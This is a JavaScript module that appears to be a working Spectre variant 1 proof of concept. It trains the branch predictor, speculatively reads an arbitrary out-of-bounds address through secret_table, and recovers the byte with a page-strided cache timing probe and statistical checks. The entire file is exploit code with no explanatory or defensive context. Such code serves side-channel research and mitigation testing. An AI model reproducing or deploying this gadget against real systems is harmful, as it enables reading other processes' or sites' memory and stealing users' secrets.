import {mean, zIndex} from "../helper/math.js";
import timer_promise from "../timer.js";
import code_buffer from "../wasm-buffer.js";
import IndicatorTable from "../indicator-table.js";

let junk = 0;
const training_number = 6;

export default
(async () => {
    let _probeTable;
    
    const timer = await timer_promise;
    
    const secret_table = new Uint8Array(1 << 12);
    {
        const array_fill_view = new Float64Array(secret_table.buffer);
        for (let i = 0; i < array_fill_view.length; ++i) {
            array_fill_view[i] = Math.random();
        }
    }

    return {
        get secret_table() {
            return secret_table;
        },
        speculativelyReadMemory
    };
    
    function speculativelyReadMemory(address, speculative_repetitions, min_iterations, max_cache_hit_number, page_size, probe_length) {
        const time_tables = [];
        let max_indicator;
        let max_indicator_index;
        const mean_times = [];
        const indicator_table = new IndicatorTable(probe_length);
        
        let total_iterations = 0;
        for (var i = 0; i < min_iterations || time_tables.length; ++total_iterations) {
            if (!time_tables.length) {
                _speculativelyReadAddress();
            }
            const time_table = time_tables.pop();
            // process time table
            const mean_time = indicator_table.processTimetable(time_table, max_cache_hit_number);
            // lower limit check is done by indicator_table
            if (mean_time) {
                mean_times.push(mean_time);
                // console.log(max_indicator_index, address);
            } else {
                // console.warn("slow timer");
                if (total_iterations > min_iterations) {
                    break;
                }
                continue;
            }
            // console.log(`%cprobe index time ${time_table[probe_index]}`, "font-size: .9em");
            max_indicator = Math.max(...indicator_table);
            let current_max_indicator_index = indicator_table.indexOf(max_indicator);
            // check for multiple maxima
            for (let i = current_max_indicator_index + 1; i < indicator_table.length; ++i) {
                if (max_indicator == indicator_table[i]) {
                    current_max_indicator_index = undefined;
                    break;
                }
            }
            // max_indicator_index changed
            if (max_indicator_index != current_max_indicator_index) {
                i = (current_max_indicator_index !== undefined) | 0;
                max_indicator_index = current_max_indicator_index;
                // console.warn("max_indicator_index changed");
            } else {
                ++i;
            }
        }
        const mean_time = mean(mean_times);
        if (max_indicator_index !== undefined) {
            globalThis.w = globalThis.w || [];
            globalThis.w.push(max_indicator_index);
        }
        if (i < min_iterations) {
            max_indicator_index = undefined;
            // console.warn("index test failed");
        }
        if (max_indicator_index !== undefined) {
            globalThis.w2 = globalThis.w2 || [];
            globalThis.w2.push(max_indicator_index);
        }
        // prepare results
        let second_indicator = -Infinity;
        for (let i = 0; i < indicator_table.length; ++i) {
            const indicator = indicator_table[i];
            if (indicator > second_indicator && i != max_indicator_index) {
                second_indicator = indicator;
            }
        }
        const second_ratio = second_indicator / max_indicator;
        // console.log("second ratio", second_ratio);
        return {
            max_indicator_index,
            second_ratio,
            // normalized_indicator_table: indicator_table.getNormalized(),
            mean_time,
            total_iterations
        };
    
        function probeTable(probe_table) {
            const time_table = new Uint32Array(probe_length);
            // const probe_table = new Uint8Array(probe_length * page_size);
            const random_offset = Math.random() * 256 | 0;
            // console.log("random offset", random_offset);
            // probe table
            for (let i = random_offset; i < random_offset + probe_length; ++i) {
                const _i = i % 256;
                const probe_index = (_i + 1) * page_size;
                timer.restore();
                junk ^= probe_table[probe_index];
                time_table[_i] = timer.load();
            }
            time_tables.push(time_table);
        }
        
        function _speculativelyReadAddress() {
            // run the speculative execution at least twice
            // the first run causes secret_table[fixed_index] to be loaded from RAM (cache miss)
            // this means that the speculative branch takes long to execute and thus is likely to get caught by the branch rollback
            // the second time that the speculative execution runs, secret_table[fixed_index] is already cached and therefore fast
            // for (let j = 0; j < speculative_repetitions; ++j) {
                // const probe_table = new Uint8Array((1 + probe_length) * page_size);
                // const delay_array = new Uint8Array(2 * page_size);
                let first = true;
                for (let i = 0; i < training_number * speculative_repetitions; ++i) {
                    const probe_table = new Uint8Array((1 + probe_length) * page_size);
                    const delay_array = new Uint8Array(2 * page_size);
                    // helper variables to optimize assembly code
                    const invalid_access = !((i + 1) % training_number) | 0;
                    const fixed_address = address * invalid_access;
                    const fixed_page_size = page_size * invalid_access;
                    // ensure evaluation before jump condition
                    // load probe_table[0] to cache the probe_table address
                    junk ^= fixed_address | fixed_page_size | probe_table[0];
                    // load condition from RAM so speculative execution gets triggered
                    if (delay_array[fixed_page_size] || !invalid_access) {
                        const secret_value = secret_table[fixed_address];
                        // map valid accesses to the address (probe_tables)
                        // map invalid accesses to their respective probe boxes
                        junk ^= probe_table[(1 + secret_value) * fixed_page_size & 0xffffff];
                    }
                    if (invalid_access) {
                        if (!first) {
                            probeTable(probe_table);
                        } else {
                            first = false;
                        }
                    } 
                }
            // }
            // probe table
            // probeTable(probe_table);
        }
    }
})();